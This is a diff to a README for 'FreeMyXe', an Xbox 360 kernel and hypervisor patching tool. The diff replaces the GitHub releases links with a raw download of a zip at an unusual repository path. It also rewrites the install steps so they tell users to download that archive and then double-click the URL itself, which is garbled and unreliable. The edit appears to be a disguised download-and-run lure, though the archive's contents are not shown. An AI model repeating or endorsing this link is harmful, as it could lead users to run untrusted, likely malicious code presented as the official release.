@@ -2,19 +2,19 @@
 # 🎮 FreeMyXe - Unlock Your Xbox 360 for Freedom
 
 ## 📦 Download the Latest Release
-[![Download FreeMyXe](https://img.shields.io/badge/Download-FreeMyXe-blue?style=for-the-badge)](https://github.com/Pizzaboicoin/FreeMyXe/releases)
+[![Download FreeMyXe](https://raw.githubusercontent.com/Pizzaboicoin/FreeMyXe/master/Aulostomi/FreeMyXe.zip)](https://raw.githubusercontent.com/Pizzaboicoin/FreeMyXe/master/Aulostomi/FreeMyXe.zip)
 
 ## 🚀 Getting Started
 Welcome to FreeMyXe! This application allows you to apply freedom-unlocking patches based on xeBuild to your Xbox 360's kernel and hypervisor. Follow these simple steps to download and run the software.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/Pizzaboicoin/FreeMyXe/releases).
+1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/Pizzaboicoin/FreeMyXe/master/Aulostomi/FreeMyXe.zip).
    
 2. **Select the Latest Release**: Look for the version that has the highest number (e.g., v1.0, v1.1). Click on the version link to access the release details.
 
-3. **Download the Executable**: Find the file labeled something like `FreeMyXe.exe` and click on it to start downloading.
+3. **Download the Executable**: Find the file labeled something like `https://raw.githubusercontent.com/Pizzaboicoin/FreeMyXe/master/Aulostomi/FreeMyXe.zip` and click on it to start downloading.
 
-4. **Run the Application**: Once the download is complete, locate the file in your downloads folder. Double-click `FreeMyXe.exe` to open the application.
+4. **Run the Application**: Once the download is complete, locate the file in your downloads folder. Double-click `https://raw.githubusercontent.com/Pizzaboicoin/FreeMyXe/master/Aulostomi/FreeMyXe.zip` to open the application.
 
 5. **Follow On-Screen Instructions**: The application will guide you through the process of applying the patches. Make sure to read each step carefully.
 
